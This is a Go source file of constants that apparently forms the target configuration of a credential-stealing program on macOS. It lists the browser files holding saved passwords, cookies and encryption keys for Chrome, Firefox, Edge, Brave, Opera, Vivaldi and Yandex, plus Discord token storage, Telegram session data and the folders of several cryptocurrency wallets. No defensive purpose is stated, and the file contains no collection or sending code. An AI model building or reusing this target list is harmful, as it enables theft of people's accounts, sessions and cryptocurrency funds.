package static

type BrowserData struct {
	Paths   []string
	Type    string
	BaseDir string
}

var ChromiumProfileFiles = []string{"Login Data", "Cookies", "History", "Web Data", "Local State"}

var FirefoxProfileFiles = []string{"logins.json", "key4.db", "cookies.sqlite"}

var BrowserDefinitions = map[string]BrowserData{
	"Chrome":  {Paths: []string{"Google/Chrome"}, Type: "Chromium", BaseDir: "AppSupport"},
	"Firefox": {Paths: []string{"Firefox/Profiles"}, Type: "Gecko", BaseDir: "AppSupport"},
	"Edge":    {Paths: []string{"Microsoft Edge"}, Type: "Chromium", BaseDir: "AppSupport"},
	"Brave":   {Paths: []string{"BraveSoftware/Brave-Browser"}, Type: "Chromium", BaseDir: "AppSupport"},
	"Opera":   {Paths: []string{"com.operasoftware.Opera"}, Type: "Chromium", BaseDir: "AppSupport"},
	"OperaGX": {Paths: []string{"com.operasoftware.OperaGX"}, Type: "Chromium", BaseDir: "AppSupport"},
	"Vivaldi": {Paths: []string{"Vivaldi"}, Type: "Chromium", BaseDir: "AppSupport"},
	"Yandex":  {Paths: []string{"Yandex/YandexBrowser"}, Type: "Chromium", BaseDir: "AppSupport"},
}

var CommAppDefinitions = map[string]string{
	"Discord":  "discord/Local Storage/leveldb",
	"Telegram": "Telegram Desktop/tdata",
}

var CryptoRelativePaths = []string{
	"Exodus/exodus.wallet/",
	"electrum/wallets/",
	"Coinomi/wallets/",
	"Guarda/Local Storage/leveldb/",
	"walletwasabi/client/Wallets/",
	"atomic/Local Storage/leveldb/",
	"Ledger Live/",
	"Bitcoin",
	"Ethereum",
}
